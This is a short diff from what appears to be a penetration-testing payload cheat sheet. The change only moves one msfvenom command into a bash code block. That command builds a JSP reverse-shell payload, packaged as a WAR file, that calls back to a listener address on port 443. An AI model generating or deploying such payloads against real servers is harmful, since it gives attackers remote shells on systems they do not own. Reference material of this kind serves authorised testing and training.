@@ -107,7 +107,9 @@
 
 * War
 
-  ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war ```
+  ```bash
+  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war
+  ```
 
 ## Windows
 
